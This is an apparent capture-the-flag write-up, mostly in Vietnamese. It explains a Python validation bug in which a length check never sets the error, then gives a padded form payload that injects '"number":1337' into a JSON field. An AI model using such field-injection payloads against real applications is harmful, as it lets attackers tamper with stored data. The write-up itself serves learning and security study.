vuln in 
```py
if "'" in favorite_value: error = 'Custom favorite may not contain single quote'
	if len(favorite_value) > 64: 'Custom favorite too long'
```
Ở đây check length của `favorite_value` nhưng không gán vô `error` => mình có thể nhập favorite_value mà không cần chú ý đến length.
Sử dụng favorite_value ghi đè number thành 1337

payload
```
name=taidh&image=images&favorite_key=a&favorite_value=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa","number":1337}&word=b&number=1&bio=taidh1234
```